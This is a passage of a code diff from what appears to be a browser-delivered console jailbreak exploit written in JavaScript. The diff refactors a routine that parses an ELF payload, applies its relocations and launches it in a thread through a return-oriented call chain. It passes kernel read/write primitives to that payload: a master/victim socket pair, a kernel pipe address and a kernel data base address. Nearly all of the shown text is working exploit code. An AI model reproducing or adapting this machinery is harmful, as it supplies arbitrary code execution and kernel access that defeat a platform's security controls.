+            // Pass master/victim pair to payload so it can do read/write
+            p.write4(rwpair_mem.add32(0x00), krw.masterSock);
+            p.write4(rwpair_mem.add32(0x04), krw.victimSock);
 
-            // Parse relocs and apply them
-            for (let i = 0; i < rela_table_count; i++) {
-                let r_offset = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
-                    OFFSET_RELA_OFFSET));
-                let r_info = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
-                    OFFSET_RELA_INFO));
-                let r_addend = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
-                    OFFSET_RELA_ADDEND));
+            // Arguments to entrypoint
+            p.write8(args.add32(0x00), dlsym_addr);         // arg1 = dlsym_t* dlsym
+            p.write8(args.add32(0x08), krw.pipeMem);        // arg2 = int *rwpipe[2]
+            p.write8(args.add32(0x10), rwpair_mem);         // arg3 = int *rwpair[2]
+            p.write8(args.add32(0x18), krw.pipeAddr);       // arg4 = uint64_t kpipe_addr
+            p.write8(args.add32(0x20), krw.kdataBase);      // arg5 = uint64_t kdata_base_addr
+            p.write8(args.add32(0x28), test_payload_store); // arg6 = int *payloadout
 
-                let reloc_addr = mapping_addr.add32(r_offset.low);
+            // Execute payload in pthread
+            debug_log("    Executing...", LogLevel.INFO);
+            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));
 
-                // If the relocation falls in the executable section, we need to redirect the write to the
-                // writable shadow mapping or we'll crash
-                if (r_offset.low <= text_segment_sz) {
-                    reloc_addr = shadow_write_mapping.add32(r_offset.low);
-                }
+        }
 
-                if ((r_info.low & 0xFF) == ELF_R_AMD64_RELATIVE) {
-                    let reloc_value = mapping_addr.add32(r_addend.low); // B + A
-                    p.write8(reloc_addr, reloc_value);
-                }
+        /**
+         * @returns Promise<number> - The return value of the payload
+         */
+        var wait_for_elf_to_exit = async function () {
+            // Join pthread and wait until we're finished executing
+            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
+            let res = p.read8(test_payload_store).low << 0;
+            debug_log("    Finished, out = 0x" + res.toString(16), LogLevel.LOG);
+
+            return res;
+        }
+
+        var load_local_elf = async function (filename) {
+            try {
+                let total_sz = await load_payload_into_elf_store_from_local_file(filename);
+                await parse_elf_store(total_sz);
+                await execute_elf_store();
+                return await wait_for_elf_to_exit();
+            } catch (error) {
+                debug_log("Failed to load local elf: " + error, LogLevel.ERROR);
+                return -1;
             }
         }
-
-    }
-
-    // reuse these plus we can more easily access them
-    let rwpair_mem = p.malloc(0x8);
-    let test_payload_store = p.malloc(0x8);
-    let pthread_handle_store = p.malloc(0x8);
-    let pthread_value_store = p.malloc(0x8);
-    let args = p.malloc(0x8 * 6);
-
-    async function execute_elf_store() {
-        // zero out the buffers defined above
-        p.write8(rwpair_mem, 0);
-        p.write8(rwpair_mem.add32(0x4), 0);
-        p.write8(test_payload_store, 0);
-        p.write8(pthread_handle_store, 0);
-        p.write8(pthread_value_store, 0);
-        for (let i = 0; i < 0x8 * 6; i++) {
-            p.write1(args.add32(i), 0);
-        }
-
-        // Pass master/victim pair to payload so it can do read/write
-        p.write4(rwpair_mem.add32(0x00), master_sock);
-        p.write4(rwpair_mem.add32(0x04), victim_sock);
-
-        // Arguments to entrypoint
-        p.write8(args.add32(0x00), dlsym_addr);         // arg1 = dlsym_t* dlsym
-        p.write8(args.add32(0x08), pipe_mem);           // arg2 = int *rwpipe[2]
-        p.write8(args.add32(0x10), rwpair_mem);         // arg3 = int *rwpair[2]
-        p.write8(args.add32(0x18), pipe_addr);          // arg4 = uint64_t kpipe_addr
-        p.write8(args.add32(0x20), kdata_base);         // arg5 = uint64_t kdata_base_addr
-        p.write8(args.add32(0x28), test_payload_store); // arg6 = int *payloadout
-        // Execute payload in pthread
-        //debug_log("  [+] executing!");
-        await chain.call(libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));
-
-    }
-
-    async function wait_for_elf_to_exit() {
-        // Join pthread and wait until we're finished executing
-        await chain.call(libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
-        debug_log("  [+] finished, out = 0x" + p.read8(test_payload_store).toString(16));
-        //EndTimer();
-
-        // await debug_log("[+] Done.");
-    }
-
-    async function load_local_elf(filename) {
-        try {
-            let total_sz = await load_payload_into_elf_store_from_local_file(filename);
-            await parse_elf_store(total_sz);
-            await execute_elf_store();
-            await wait_for_elf_to_exit();
-        } catch (error) {
-            debug_log("[!] failed to load local elf: " + error);
-        }
-    }
     
     async function load_etahen(){
       load_local_elf("elfldr.elf");
@@ -1024,5 +1099,5 @@ async function wait_for_worker() {
 }
 
 function run_hax() {
-    userland();
+    prepare();
 }
